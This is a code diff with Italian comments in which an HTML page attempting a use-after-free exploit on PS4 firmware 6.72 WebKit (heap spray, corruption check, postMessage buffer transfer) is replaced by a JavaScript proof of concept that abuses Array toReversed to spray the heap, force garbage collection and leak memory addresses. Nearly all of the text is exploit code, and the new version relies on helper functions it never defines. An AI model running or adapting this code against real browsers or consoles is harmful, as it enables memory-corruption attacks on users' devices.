@@ -1,89 +1,39 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PS4 6.72 Test</title>
-</head>
-<body>
-<script>
-// Configurazione per PS4 6.72
-const ALLOC_SIZE = 0x400;    // Dimensione ottimale per WebKit vecchio
-const SPRAY_NUM = 5000;      // Adeguato per memorie limitate
-const MAGIC = 0x1337beef;    // Marcatore univoco
+const v1 = [-1n]; // create a JSArray 
+let v2;
 
-let spray = [];
-let keepAlive = [];
+// Controllo se .toReversed() esiste
+if (Array.prototype.toReversed) {
+    alert("Usando toReversed() per v1");
+    v2 = v1.toReversed(); // call arrayProtoFuncToReversed
+} else {
+    alert("toReversed() non esiste! Usando reverse() per v1");
+    v2 = [...v1].reverse(); // Alternativa se toReversed non è disponibile
+}
 
+alert(describe(v2));
+sleepSeconds(5); // pause execution
+alert(v2[2]?.print()); // access randomly a field of v2[2]
+
+// 2 Leaking addresses
 function gc() {
-    try {
-        let waste = [];
-        for(let i = 0; i < 50000; i++) waste.push(new Uint8Array(ALLOC_SIZE));
-    } catch(e) { alert("GC ERROR: " + e); }
+    new Uint8Array(4 * 1024 * 1024);
 }
 
-function setup() {
-    let arr = [];
-    for(let i = 0; i < 50; i++) {
-        arr.push({
-            id: i,
-            buf: new ArrayBuffer(ALLOC_SIZE),
-            marker: MAGIC
-        });
-    }
-    return arr;
+let spray_arr = new Array(0x20);
+for (let i = 0; i < 0x40; i++) {
+   spray_arr[i] = [2.1*i, 2.2, 2.3]; // spray some arrays
+}
+gc(); // clean memory and force allocation reusing above’s heap 
+
+let b1 = [1.1];
+
+if (Array.prototype.toReversed) {
+    alert("Usando toReversed() per b1");
+    b1 = b1.toReversed();
+} else {
+    alert("toReversed() non esiste! Usando reverse() per b1");
+    b1 = [...b1].reverse();
 }
 
-function sprayHeap() {
-    try {
-        for(let i = 0; i < SPRAY_NUM; i++) {
-            let buf = new ArrayBuffer(ALLOC_SIZE);
-            let view = new Uint32Array(buf);
-            view[0] = 0x41414141;
-            view[1] = 0x42424242;
-            spray.push(buf);
-        }
-        keepAlive = spray.slice();
-        alert("[+] Heap spray OK!\nAllocati: " + SPRAY_NUM + " buffer");
-    } catch(e) { alert("[-] Spray failed: " + e); }
-}
-
-function checkCorruption() {
-    for(let i = 0; i < spray.length; i++) {
-        let view = new Uint32Array(spray[i]);
-        if(view[0] !== 0x41414141) {
-            alert("[!] Buffer corrotta a index: " + i + 
-                "\nValore: 0x" + view[0].toString(16));
-            return true;
-        }
-    }
-    return false;
-}
-
-function start() {
-    try {
-        alert("[*] Inizio exploit...");
-        let target = setup();
-        sprayHeap();
-
-        addEventListener('message', e => {
-            setTimeout(() => {
-                gc();
-                if(checkCorruption()) {
-                    alert("[+] UAF successo!");
-                    // Aggiungi logica exploit qui
-                } else {
-                    alert("[-] Exploit fallito");
-                }
-            }, 150);
-        }, {once: true});
-
-        postMessage(target, '*', target.map(x => x.buf));
-        alert("[*] Messaggio inviato!");
-
-    } catch(e) { alert("[!] CRASH: " + e); }
-}
-
-// Avvia dopo 3 secondi per caricamento pagina
-setTimeout(start, 3000);
-</script>
-</body>
-</html>
+let addr1 = f2i(b1[1]); // b1[1] is previous heap chunk and will be leaked
+alert("leak1: " + hex(addr1));
